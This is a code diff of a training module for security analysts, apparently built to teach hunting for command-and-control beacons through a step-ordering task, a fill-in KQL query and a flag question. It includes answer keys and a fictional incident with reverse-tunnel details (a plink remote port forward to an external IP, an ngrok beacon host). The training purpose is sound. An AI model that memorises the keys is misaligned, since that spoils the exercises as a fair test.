-        { id: "preserve", text: "Capture SRV-DB07's memory and its live process and connection lists while the beacon is still running" },
-        { id: "watch", text: "Before releasing any host from isolation, watch proxy and DNS logs for the same beacon pattern reaching a new destination" },
-        { id: "scope", text: "Search every host's proxy, DNS and EDR data for the indicators you captured: the ngrok host name, the destination IP and the implant's hash" },
-        { id: "eradicate", text: "On the isolated hosts, remove what relaunches the implant and reset the accounts it used or could reach" },
+        { id: "collect", text: "Pull every proxy-log connection timestamp for each host/destination pair over a multi-hour window" },
+        { id: "deltas", text: "Turn each pair's timestamp list into inter-arrival deltas (the gap between successive connections)" },
+        { id: "band", text: "From those deltas, compute mean and standard deviation to test for a tight, bounded cluster" },
+        { id: "bytes", text: "Combine the clustering result with repetition count and bytes-per-connection consistency into a beacon score" },
+        { id: "rarity", text: "Keep only the high-scoring pairs whose destination is rare across the environment, dropping widely used services" },
+        { id: "ancestry", text: "On each host that survives that filter, pivot to endpoint telemetry to find the owning process and its command line" },
+        { id: "verdict", text: "With the owning process identified, check for a documented legitimate explanation, then close or escalate" },
       ],
-      correct_order: ["preserve", "scope", "contain", "eradicate", "watch", "document"],
+      correct_order: ["collect", "deltas", "band", "bytes", "rarity", "ancestry", "verdict"],
       explanation:
-        "Preserve first: a restart, reboot or reimage wipes the in-memory code and live connection that explain how SQL Server was made to run it. Scope second, using the indicators the capture gave you, because a careful operator who sees one channel cut switches to an implant you have not found yet, and with no active data loss a SIEM search costs only minutes. Contain third, isolating every confirmed host and blocking the destination together: blocking alone leaves the foothold, isolating one host alone warns the others. Eradicate only on contained hosts, so the attacker cannot re-plant what you remove. Watch for a re-beacon before release, since that is how you learn eradication missed something. Document last, when the timeline and the actions are complete.",
+        "Each step needs the previous step's output: timestamps must exist before deltas can be computed; deltas before their mean and spread; the clustering result before it can be scored together with repetition and byte consistency; scores before the high-scoring pairs can be filtered by destination rarity (which removes busy update/telemetry services that also look regular); the surviving hosts before you know where to pull endpoint process context; and the owning process before you can ask its owner for a legitimate explanation and decide. Reading 6 puts process ancestry first when an endpoint alert already names the process, in a hunt that starts from network data alone, you only reach the endpoint once the timing math has told you which host to look at.",
       xp: 35,
     },
 
-    // ── Written report: close the case ──────────────────────────────────────
+    // ── Query Fill: KQL to surface beacon-shaped connections by interval ────
     {
-      type: "written_report" as const,
-      id: "tunnel-wr1",
-      heading: "Close the Case",
+      type: "query_fill" as const,
+      id: "tunnel-qf1",
+      heading: "Write It Yourself: Surface Beacon-Shaped Connections in KQL",
+      language: "kql",
       context:
-        "INC-2026-0703-11 covers this week's tunneling findings at Solvix: the plink.exe session on SRV-APP12 (Log Analysis 1), the beacon from SRV-DB07 (Log Analysis 2) and the ngrok alert on WKS-DEV27 that you triaged. Both servers have been contained in the order you set. The incident manager needs your closing summary before handing the case to incident response.",
-      prompt:
-        "Write the closing summary: each channel you confirmed (host, tool or process, account, destination, what it gave the attacker, and the evidence), the alert you closed and why, what was done, the ATT&CK techniques, and your verdict.",
-      rubricHints: [
-        "Name each confirmed channel by host and by the tool or process behind it",
-        "Cite the real values you saw: destinations, ports, the account, timing and session figures",
-        "Say what each channel gave the attacker, in plain words",
-        "Explain why the third alert was closed and what evidence supported that",
-        "List the response actions in order, map the techniques to ATT&CK, and end with a clear verdict",
+        "Turn the pattern from Log Analysis 2 into a one-hour hunt over Defender for Endpoint network events. The rows are sorted per device and destination so prev() can compute each gap, and the first row of every pair gets a null gap. Requirements: (1) HTTPS only; (2) measure the SPREAD of the gaps, not their average, Reading 4's signal is tight clustering; (3) the count threshold must ignore pairs with fewer than 10 connections in the hour, yet still keep a beacon that sleeps at most 120 seconds (about 30 connections per hour); (4) the spread threshold, a whole number of seconds, must keep Log Analysis 2's beacon (standard deviation 6.8 s) while dropping human browsing, whose gaps typically vary with a standard deviation of 30 s or more.",
+      template:
+        "DeviceNetworkEvents\n| where Timestamp > ago(1h)\n| where RemotePort == {{port}}\n| sort by DeviceName asc, RemoteUrl asc, Timestamp asc\n| extend Delta = iff(DeviceName == prev(DeviceName) and RemoteUrl == prev(RemoteUrl), datetime_diff('second', Timestamp, prev(Timestamp)), long(null))\n| summarize ConnectionCount = count(), AvgDelta = avg(Delta), StdDelta = {{agg}}(Delta) by DeviceName, RemoteUrl\n| where ConnectionCount > {{threshold}} and StdDelta < {{maxstd}}",
+      blanks: [
+        { id: "port", answers: ["443"], placeholder: "standard HTTPS port" },
+        { id: "agg", answers: ["stdev", "stdevp"], placeholder: "KQL aggregation that measures the spread of the gaps" },
+        { id: "threshold", answers: ["9", "10", "11", "12", "13", "14", "15", "16", "17", "18", "19", "20", "21", "22", "23", "24", "25", "26", "27", "28", "29"], placeholder: "connection-count threshold (see requirement 3)" },
+        { id: "maxstd", answers: ["7", "8", "9", "10", "11", "12", "13", "14", "15", "16", "17", "18", "19", "20", "21", "22", "23", "24", "25", "26", "27", "28", "29", "30"], placeholder: "maximum standard deviation in whole seconds (see requirement 4)" },
       ],
-      referenceIocs: [
-        "SRV-APP12",
-        "plink.exe",
-        "svc_report",
-        "45.83.219.11",
-        "SRV-DB07",
-        "sqlservr.exe",
-        "8f2a9c1e.ngrok-free.app",
-        "WKS-DEV27",
-      ],
-      minWords: 100,
       explanation:
-        "A strong closing summary reads like this. Two confirmed channels and one closed alert. SRV-APP12: SOLVIX\\svc_report ran plink.exe from a Temp folder with -R 3389:127.0.0.1:3389, carried over SSH on port 443 to 45.83.219.11, so whoever controls that server can reach SRV-APP12's RDP through an outbound connection (Protocol Tunneling T1572, Non-Standard Port T1571). plink had never run on the host in 90 days and the session was still open after four hours. SRV-DB07: sqlservr.exe made 58 TLS sessions in one hour to 8f2a9c1e.ngrok-free.app (3.15.44.88) with gaps averaging 61.2 s and a standard deviation of only 6.8 s, a jittered beacon (Web Protocols T1071.001 inside an Encrypted Channel T1573, relayed through a tunneling service, T1572), against a network policy that allows only the app tier and backups. WKS-DEV27: one 44-minute ngrok.exe session during a calendar demo under a standing, approved exception, closed as a benign true positive. Actions: memory and live connections captured, all hosts searched for the indicators, both servers isolated and the destinations blocked at the proxy, firewall and DNS, persistence removed and svc_report reset, re-beacon monitoring before release. Verdict: true positive, two active tunnel/C2 channels; escalated to incident response to establish how code ran inside SQL Server and what data it reached. Every value is one you saw in the evidence.",
-      xp: 50,
+        "RemotePort == 443 limits the hunt to HTTPS. Sorting by device, destination and time serializes the rows so prev() works, and the iff() stops a gap from being computed across two different device/destination pairs. stdev (or the population variant stdevp) measures how tightly the gaps cluster (the beacon signal from Reading 4) whereas an average alone cannot tell a tight 60 s beacon from human traffic that happens to average 60 s. For the count, ConnectionCount > N drops pairs with 9 or fewer connections only if N is at least 9, and keeps a 30-connection beacon only if N is at most 29, so any value from 9 to 29 is correct. For the spread, StdDelta < X keeps Log Analysis 2 (6.8 s) only if X is at least 7, and drops a standard deviation of 30 s only if X is at most 30, so any whole number from 7 to 30 is correct.",
+      xp: 35,
+    },
+
+    // ── Flag ──────────────────────────────────────────────────────────────
+    {
+      type: "flag" as const,
+      id: "tunnel-f1",
+      prompt:
+        "Go back to Log Analysis 1, the plink.exe event on SRV-APP12. The egress firewall only ever sees the outer SSH connection that carries the tunnel. Which destination TCP port will the firewall record for that connection? Enter the number only.",
+      answer: "443",
+      hint: "In plink's command line, the ports inside the forwarding specification are not the port of the SSH server itself: a separate flag sets that.",
+      xp: 25,
     },
   ],
 };
